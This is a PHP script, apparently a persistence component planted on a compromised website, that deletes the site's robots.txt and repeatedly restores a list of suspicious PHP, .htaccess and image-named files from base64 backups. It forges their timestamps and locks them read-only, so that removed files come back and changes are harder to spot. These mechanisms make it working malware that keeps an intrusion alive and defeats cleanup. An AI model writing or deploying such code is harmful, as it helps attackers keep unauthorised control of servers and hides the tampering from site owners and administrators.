<?php 
error_reporting(0);
$checksave = false;
function file_put_contentnew($filename, $s) {
		$fp = @fopen($filename,'wb');
		@fwrite($fp, $s);
		@fclose($fp);
		return TRUE;
}
function mkFolder($path) {
    if (!is_readable($path)) {
        is_file($path) or mkdir($path, 0755 ,true);
    }
}

function safefile() {
	global $checksave;
	$filegml = "D:\\Vhosts\\WebRoot\\twcds.com.tw\\";
	$filerobots = $filegml."robots.txt";
	@chmod($filerobots, 0644);
	unlink($filerobots);
	
	$filelist = array("D:\\Vhosts\\WebRoot\\twcds.com.tw\\course\\images\\network.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\service\\images\\sys_haparts\\fallspec.jpg","D:\\Vhosts\\WebRoot\\twcds.com.tw\\service\\images\\sys_typedoc\\easytype.jpg","D:\\Vhosts\\WebRoot\\twcds.com.tw\\service\\images\\sys_soundidea\\faqseasy.jpg","D:\\Vhosts\\WebRoot\\twcds.com.tw\\service\\images\\sys_notififall\\docsmanual.jpg","D:\\Vhosts\\WebRoot\\twcds.com.tw\\service\\images\\sys_deathwait\\ageextlib.jpg","D:\\Vhosts\\WebRoot\\twcds.com.tw\\mailcorp\\lowcla.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\mailcorp\\.htaccess","D:\\Vhosts\\WebRoot\\twcds.com.tw\\acrossmobile\\wholeedu.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\acrossmobile\\.htaccess","D:\\Vhosts\\WebRoot\\twcds.com.tw\\towneither\\reposfree.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\towneither\\.htaccess","D:\\Vhosts\\WebRoot\\twcds.com.tw\\pagesmate\\moneydocs.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\pagesmate\\.htaccess","D:\\Vhosts\\WebRoot\\twcds.com.tw\\corpabove\\viewable.php","D:\\Vhosts\\WebRoot\\twcds.com.tw\\corpabove\\.htaccess");

	$timeinc = 60;
	$time = time();
	$timefile = dirname(__FILE__) . '/time.html';
	$logfile = dirname(__FILE__) . '/log.html';
	$timefiletxt = file_get_contents($timefile);
	$checktime = true;
	if ($time - $timefiletxt < $timeinc) {
		$checktime = false;
		if(!$checksave)
		{
			echo 'Time://'.($time - $timefiletxt);
		}
		file_put_contentnew($logfile, 'Time://'.($time - $timefiletxt));
	} else {
		file_put_contentnew($timefile, $time);
	}
	
	if($checktime)
	{
		$resultstr = '';
		foreach ($filelist as $k => $v) {
			mkFolder(dirname($v));
			@chmod($v, 0777);
			$resultstr .= '<br/><br/>OLDFILE.//'.$v;
			$savefile =  md5($v);
			$resultstr .= '<br/>NO.//'. $k .'<br/>BEIFENFILENAME://'.$savefile;
			$filetxt = file_get_contents(dirname(__FILE__) ."/". $savefile);
			if($filetxt != '')
			{
					$statx = stat($v);
					file_put_contentnew($v, base64_decode($filetxt));
					@touch($v, $statx[9], $statx[8]);
					$resultstr .= '<br/>HUANYUAN://'.$v;
					
			}
			else
			{
				$filetxt = file_get_contents($v);
				if($filetxt != '')
				{
					file_put_contentnew(dirname(__FILE__) ."/". $savefile, base64_encode($filetxt));
					$resultstr .= '<br/>BEIFEN://'.dirname(__FILE__) ."/". $savefile;
				}
			}
			@chmod($v, 0444);
		}
		if(!$checksave)
		{
			echo $resultstr;
		}
		file_put_contentnew($logfile, date("Y-m-d H:i:s",time()).'<br/>'.$resultstr);
	}
	$checksave = true;
}
safefile();
?>